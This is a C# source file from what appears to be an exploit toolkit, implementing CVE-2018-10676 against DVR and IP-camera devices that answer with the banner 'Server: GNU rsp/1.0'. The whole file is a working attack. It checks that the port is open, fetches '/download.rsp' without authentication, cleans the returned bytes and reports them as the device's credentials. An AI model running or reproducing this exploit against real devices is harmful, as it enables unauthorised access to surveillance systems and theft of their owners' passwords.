using System;
using System.Text;
using System.Text.RegularExpressions;
using ExploitMaker;
using ExploitMaker.Exceptions;
using ExploitMaker.Helpers;

namespace Exploits
{
    public class CVE_2018_10676 : Exploit
    {
        public override string Description => CommonName + ": Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'";

        public override string CommonName => "CVE-2018-10676";

        public override Credencial Run(Camera cam)
        {
            const int dataLength = 66000; //This is an aproximate size

            if (!ConnectionHelper.IsOpenPort(cam.Host, int.Parse(cam.Port)))
            {
                var notReachMsg = string.Format(Phrases.IP_Camera_Is_Not_Reachable, cam.Address, CommonName);
                throw new ExploituUreachableTargetException(notReachMsg, cam, CommonName);
            }

            using (var result = ConnectionHelper.DownloadHttpFile(cam.Host, cam.Port, cam.UrlHttp + "/download.rsp", dataLength))
            {
                //If we get null, the server is not alive
                if (result == null)
                {
                    var notReachMsg = string.Format(Phrases.IP_Camera_Is_Not_Reachable, cam.Address, CommonName);
                    throw new ExploituUreachableTargetException(notReachMsg, cam, CommonName);
                }

                //If we get a response, the server is vulnerable
                var bytes = BinaryHelper.ReadBytes(result);
                var fullFileString = Encoding.UTF8.GetString(bytes);
                var str = CleanString(fullFileString);

                return str.ToLower().Contains("</html>") ? null : new Credencial("", "", Phrases.Check_Message_For_Password + ":" + str);
            }
        }

        private string CleanString(string content)
        {
            var ascciPrinteable = new StringBuilder();
            foreach (var c in content)
            {
                if (c >= 32 && c <= 126)
                    ascciPrinteable.Insert(ascciPrinteable.Length, c);
                else if (c == 0)
                {
                    ascciPrinteable.Insert(ascciPrinteable.Length, " ");
                }
            }
            return  Regex.Replace(ascciPrinteable.ToString(), @"\s+", " ");
        }
    }
}